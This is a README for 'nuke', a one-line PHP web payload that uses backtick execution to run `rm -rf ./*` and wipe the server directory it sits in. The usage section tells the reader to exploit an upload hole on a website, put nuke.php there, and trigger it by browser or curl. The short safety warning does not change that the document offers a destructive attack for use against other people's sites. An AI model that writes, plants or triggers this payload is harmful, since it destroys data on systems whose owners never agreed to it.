# nuke
nukes the current working directory into oblivion (and beyond).

## breakdown
```php
<?= rm -rf ./* ?>
// this script is really dangerous. only run it in a controlled and safe enviroment
```
- `<?=\` is shorthand for `<?php echo`, which simply outputs the following expression
- \``rm -rf ./*`\` the backticks around the `rm -rf ./*` execute whatever is inside them, just like shell_exec
- `rm -rf ./*` force-deletes everything in the current dir

## usage
- find vulnerability in website that allows you to upload files (sql injection, webdav, etc.)
- upload the file `nuke.php` to a website.
- visit the page or send a request to it 
1. open https://example.com/nuke.php in your browser (you must replace example.com with the actual domain)
2. run this in your terminal `curl https://example.com/nuke.php`
